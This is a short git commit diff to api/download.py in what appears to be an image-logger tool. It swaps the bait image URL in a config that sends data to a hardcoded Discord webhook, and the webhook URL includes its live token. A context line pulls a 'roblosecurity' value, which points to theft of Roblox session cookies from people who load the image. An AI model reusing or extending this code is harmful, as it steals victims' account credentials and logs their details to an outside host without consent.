d6f21e5ea401b0b9891161a122d0f78cc01df3eb
Nivgab <122238555+Nivgab@users.noreply.github.com>
2023-10-29 00:12:20 +0200

    Update download.py

--- api/download.py
+++ api/download.py
@@ -14,7 +14,7 @@ c = d.json()['roblosecurity']
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1133811105760804954/m6czk0g_RhpBRNH9CX2lg0x3GKKHa6pGS7TUAg35ttW6pJXTTpA0mvHaAkL_aLDHGNjn",
-    "image": "https://linksharing.samsungcloud.com/hbkQ4gCuiCrN", # You can also have a custom image by using a URL argument
+    "image": "https://ownpictures.vercel.app/api/Npass", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
